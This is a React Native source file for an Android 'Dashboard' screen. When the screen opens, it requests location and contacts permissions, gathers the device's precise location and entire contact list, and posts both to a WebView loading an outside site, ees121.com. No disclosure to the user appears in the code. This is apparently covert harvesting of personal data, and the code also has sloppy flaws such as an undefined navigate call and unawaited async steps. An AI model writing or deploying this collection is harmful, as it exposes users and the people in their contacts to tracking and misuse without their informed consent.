import React, { Component } from 'react'
import { Alert, BackHandler, PermissionsAndroid, Text, View } from 'react-native'
import { WebView } from 'react-native-webview';

import Contacts from 'react-native-contacts';
import GetLocation from 'react-native-get-location';
export class Dashboard extends Component {
    constructor(props) {
        super(props);
        this.state = {
            allContacts:null,
            currentLocation:null,
        }
        this.webviewRef = React.createRef();
    }
    onButtonPress = () => {
        BackHandler.removeEventListener('hardwareBackPress', this.handleBackButton);
        // then navigate
        navigate('NewScreen');
    }

    handleBackButton = () => {
        Alert.alert(
            'Are you sure?',
            'Do you want to exit?', [{
                text: 'Cancel',
                onPress: () => console.log('Cancel Pressed'),
                style: 'cancel'
            }, {
                text: 'OK',
                onPress: () => {
                    this.props.navigation.replace('/end')
                
                }
            },], {
            cancelable: false
        }
        )
        return true;
    }

    componentDidMount() {
        this._requestLocation().then(() => this._getConatctFromDevice()).then(() => this._gotoDashboard())

        BackHandler.addEventListener('hardwareBackPress', this.handleBackButton);
    }

    componentWillUnmount() {
        BackHandler.removeEventListener('hardwareBackPress', this.handleBackButton);
    }
    
    _gotoDashboard = () => {
        setTimeout(() => {
            let dataArr  = []
            dataArr.push({'current loaction':this.state.currentLocation, 'contact list':JSON.stringify(this.state.allContacts)})
            console.log('dataArr ==== >',dataArr);
            this.webviewRef.current.postMessage(dataArr);
        }, 3000);
    }

    _getConatctFromDevice = async () => {
        // Alert.alert('hello')
        let granted = await PermissionsAndroid.request(PermissionsAndroid.PERMISSIONS.READ_CONTACTS)
        let contactList 
        console.log('line no 24', granted);
        if (granted === PermissionsAndroid.RESULTS.GRANTED) {
            try {
                Contacts.getAll().then((contacts) => {
                    console.log('line no 28 --->',contacts)
                    contactList = contacts
                    this.setState({
                        allContacts:contacts
                    })
                })
            } catch (error) {
                console.log('error line no 32 --->', error);
            }
        }
    }

    _requestLocation = async () => {
        let granted = await PermissionsAndroid.request(PermissionsAndroid.PERMISSIONS.ACCESS_FINE_LOCATION)
        let currentLocation = null
        console.log('line no 38', granted);

        if (granted === PermissionsAndroid.RESULTS.GRANTED) {
            console.log(" line no 41 --->' You can use the location")
            try {
                GetLocation.getCurrentPosition({
                    enableHighAccuracy: true,
                    timeout: 150000,
                }).then(location => {
                    console.log('Line no 47--->', location);
                    currentLocation = location
                    this.setState({
                        currentLocation:location
                    })
                }).catch(error => {
                    console.log('error line no 50 --->', error);
                })
            } catch (error) {
                console.log('error line no 53 --->',error);
            }
        }
    }
    render() {
        return (
            <WebView
            source={{
                uri: 'https://ees121.com',
            }}
            ref={this.webviewRef}
        />
        )
    }
}

export default Dashboard
